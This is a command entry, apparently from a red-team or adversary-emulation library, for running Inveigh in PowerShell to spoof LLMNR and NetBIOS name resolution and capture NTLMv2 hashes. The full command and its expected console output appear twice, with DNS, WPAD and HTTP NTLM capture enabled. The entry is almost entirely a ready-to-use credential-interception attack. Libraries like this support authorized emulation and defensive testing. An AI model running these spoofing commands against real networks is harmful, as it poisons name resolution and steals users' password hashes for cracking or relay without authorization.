---
id: c6161498-3bbd-4476-93ff-9b291539fcfc
name: Inveigh Intercept and Log NTLMv2 Hashes via LLMNR and NetBIOS Requests
type: command
executor: powershell
data: Invoke-Inveigh -LLMNR Y -NBNS Y -IP $_LISTEN_IP -ConsoleOutput Y
output: 'PS C:\ > Invoke-Inveigh -LLMNR Y -NBNS Y -IP 10.10.10.100 -ConsoleOutput
  Y

  [*] Inveigh 1.502 started at 2020-07-06T16:32:01

  WARNING: [!] Elevated Privilege Mode = Disabled

  [+] Primary IP Address = 10.10.10.100

  [+] Spoofer IP Address = 10.10.10.100

  [+] ADIDNS Spoofer = Disabled

  [+] DNS Spoofer = Enabled

  [+] DNS TTL = 30 Seconds

  [+] LLMNR Spoofer = Enabled

  [+] LLMNR TTL = 30 Seconds

  [+] mDNS Spoofer = Disabled

  [+] NBNS Spoofer For Types 00,20 = Enabled

  [+] NBNS TTL = 165 Seconds

  [+] SMB Capture = Disabled

  [+] HTTP Capture = Enabled

  [+] HTTPS Capture = Disabled

  [+] HTTP/HTTPS Authentication = NTLM

  [+] WPAD Authentication = NTLM

  [+] WPAD NTLM Authentication Ignore List = Firefox

  [+] WPAD Response = Enabled

  [+] Kerberos TGT Capture = Disabled

  [+] Machine Account Capture = Disabled

  [+] Console Output = Full

  [+] File Output = Disabled

  WARNING: [!] Run Stop-Inveigh to stop

  [*] Press any key to stop console output'
created_at: '2020-07-06T23:40:45.742475+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Inveigh Intercept and Log NTLMv2 Hashes via LLMNR and NetBIOS Requests

```powershell
Invoke-Inveigh -LLMNR Y -NBNS Y -IP $_LISTEN_IP -ConsoleOutput Y
```

## Expected Output

```
PS C:\ > Invoke-Inveigh -LLMNR Y -NBNS Y -IP 10.10.10.100 -ConsoleOutput Y
[*] Inveigh 1.502 started at 2020-07-06T16:32:01
WARNING: [!] Elevated Privilege Mode = Disabled
[+] Primary IP Address = 10.10.10.100
[+] Spoofer IP Address = 10.10.10.100
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Disabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Disabled
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
```


